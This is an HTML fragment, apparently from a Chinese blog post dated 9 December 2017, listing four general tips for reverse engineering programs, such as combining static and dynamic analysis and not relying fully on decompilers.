-            <h1 id="1-首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。"><a href="#1-首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。" class="headerlink" title="1.首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。"></a>1.首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。</h1><h1 id="2-使用静态和动态结合的分析思路。"><a href="#2-使用静态和动态结合的分析思路。" class="headerlink" title="2.使用静态和动态结合的分析思路。"></a>2.使用静态和动态结合的分析思路。</h1><h1 id="3-不要完全依赖于反编译器，因为程序很可能采用反调试和混淆技术，干扰其判断。"><a href="#3-不要完全依赖于反编译器，因为程序很可能采用反调试和混淆技术，干扰其判断。" class="headerlink" title="3.不要完全依赖于反编译器，因为程序很可能采用反调试和混淆技术，干扰其判断。"></a>3.不要完全依赖于反编译器，因为程序很可能采用反调试和混淆技术，干扰其判断。</h1><h1 id="4-合理使用F5大法，因为他会把一个简单的问题复杂化，简单点。"><a href="#4-合理使用F5大法，因为他会把一个简单的问题复杂化，简单点。" class="headerlink" title="4.合理使用F5大法，因为他会把一个简单的问题复杂化，简单点。"></a>4.合理使用F5大法，因为他会把一个简单的问题复杂化，简单点。</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2017年12月9日</p>
-
-          
         
       
     </div>
